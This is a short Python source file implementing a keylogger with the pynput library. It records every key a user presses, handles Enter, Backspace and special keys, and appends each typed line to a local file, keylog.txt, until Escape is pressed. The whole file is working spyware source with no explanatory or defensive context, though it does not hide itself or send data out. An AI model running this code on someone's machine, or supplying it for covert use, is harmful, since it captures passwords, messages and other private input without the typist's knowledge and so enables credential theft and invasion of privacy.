from pynput.keyboard import Key, Listener

def write_line():
    global line
    fp=open("keylog.txt","a")
    fp.write(line)
    fp.close()
    line = ''

def on_press(key):
    global line
    if key == Key.enter:
        write_line()
    elif key == Key.esc:
        write_line()
        return False
    elif key == Key.backspace:
        line = line[:-1]
    else:
        try:
            button = key.char.strip("'")
        except:
            button = '[' + str(key) + ']'

        line += button



line = ''
fp=open("keylog.txt","w")
fp.write(line)
fp.close()
with Listener(on_press=on_press) as listener:
    listener.join()
